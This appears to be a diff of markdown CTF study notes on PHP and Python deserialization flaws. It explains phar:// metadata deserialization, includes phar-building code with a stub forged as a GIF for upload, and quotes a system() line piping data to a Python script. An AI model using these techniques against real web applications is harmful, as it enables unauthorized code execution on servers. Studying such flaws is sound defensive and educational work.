@@ -4,12 +4,15 @@ Vulnerability of unserialization exists in many program languages，please remem
    *  [Serialization vs Unserialization](#serialization-vs-unserialization)  
    *  [Magic Function](#magic-function)  
    *  [Exploit](#exploit)    
-   *  [Reference](#reference)  
-   *  [With phar](#with-phar)  
+   *  [Reference](#reference1)  
+   *  [unserialize with phar](#unserialize-with-phar)  
+   *  [what is phar?](#what-is-phar)  
+   *  [how to exploit?](#how-to-exploit)  
+   *  [Reference](#reference2)  
 *  [Python Unserialization](#python-unserialization)  
    *  [Magic Function](#magic-function)  
    *  [Exploit](#exploit)  
-   *  [Reference](#reference)
+   *  [Reference](#reference3)
   
 
 # PHP Unserialization
@@ -67,14 +70,15 @@ unserialize($_GET[1]);
 Tools:  
 * [php online tool](https://1024tools.com/unserialize)
 
-## Reference
+## Reference1
 1. [chybeta's blog](https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)  
 
 ## unserialize With phar
-Sam Thomas published a new way to trigger a unserialization without use of `unserialize()` in blackhat 2018. This can be done with `php://phar`.  
-Trace to the kernel of PHP, we can find that `meta-data` would be unserialized when library function use `phar://` to parse the phar document. Therefore, we can build up a malicious phar document and pass to file functions such as:  
+Sam Thomas published a new way to trigger a unserialization without use of `unserialize()` in blackhat 2018. This can be done with stream wrapper of `phar://`.  
+Trace to the kernel of PHP, we can find that `meta-data` would be unserialized when library function use `phar://` to parse the document. Therefore, we can build up a malicious phar document and pass to file functions such as:  
 ```php
 // file(phar://) -> unserialization
+// from now on, magic function are not limited to unserialize() anymore :)
 file_exists, file_get_contents, file_put_contents, file, fopen, is_dir, is_executable, is_file, is_link, is_readable, is_writable, copy, unlink, stat, readfile
 ```  
 Just a little test can prove the concept:  
@@ -90,8 +94,23 @@ file_exists($filename);
 ```  
 Then you can see **unserialization happen!**.  
 
+## What is phar
+PHP can use phar to archive a file. A phar file can be separated into 4 parts: stub(`anything<?php blah; __HALT_COMPILER();?>`), manifest(which is the core of exploit), compressed contents, optional signature.  
+```php
+$p = new Phar('test.phar');
+$p->startBuffering();
+$p->addFromString('test.txt', 'text');
+$p->setStub('<?php __HALT_COMPILER(); ?>');
+
+class HiClass{}
+$o = new HiClass;
+$o->data = '1pwnch';
+$p->setMetadata($o);
+$p->stopBuffering();
+```
+## How to exploit
 Therefore, there are three requirements to implement it: `magic file function`, `uploadable file`, `phar:// is allowed`.  
-1. We might not be able to upload the phar file to the website directly. However, we can add other header to forge it.  
+1. We might not be able to upload the phar file to the website directly. However, we can add other header(stub) to forge it.  
 ```php
 // generate phar
 class Test {
@@ -104,16 +123,12 @@ class Test {
 @unlink("phar.phar");
 $phar = new Phar("phar.phar");
 $phar->startBuffering();
-$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");     // forge to gif
-$o = new Test();
-$o -> out = 'phpinfo();';
-$phar->setMetadata($o);      // set your own definition to metada
-$phar->addFromString("test.txt", "test");
-$phar->stopBuffering();
+$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");     // forge to gif and upload to application?filename=phar://uploads/exp.gif
+..........
 ```  
-2. Trace any function: whether it calls file open function in the bottom side, then whether we can control its parameter. What's more interesting, it even can be used to make a DOS attack.  
+2. Trace any function: whether it **calls file open function** in the bottom side, then whether we can control its parameter. What's more interesting, it even can be used to make a DOS attack.  
 
-## Reference
+## Reference2
 1. [Blackhat议题解读 | 利用 phar 拓展 php 反序列化漏洞攻击面](https://www.anquanke.com/post/id/157657)  
 2. [blackhat议题深入 | phar反序列化](https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485159&idx=1&sn=50b2e94d2d6fc5f69c540113ae9b3f1c&chksm=e89e2e3fdfe9a729869444aa593e97b52970add524b219553f646e8af2aec06e25e8678e7dde&mpshare=1&scene=23&srcid=0822QPN3ZXccNvKuWTQoahLi#rd)
 
@@ -150,6 +165,6 @@ We need `cPickle.loads` to trigger the vulnerability. His type of parameter is s
 ## Exploit
 It's always combined with the web in CTF，such as `<?php system("echo $data | python vul.py")?>`. There might be a IO in `vul.py`，so I should deliver my data to the object with **magic function** which has been converted to string.  
 
-## Reference
+## Reference3
 1. [Python反序列化小记](https://www.jianshu.com/p/061d2c594d97)  
 2. [序列化和反序列化模块pickle介绍 | Python库](https://www.jianshu.com/p/5f936abf31f7?utm_campaign=maleskine&utm_content=note&utm_medium=seo_notes&utm_source=recommendation)
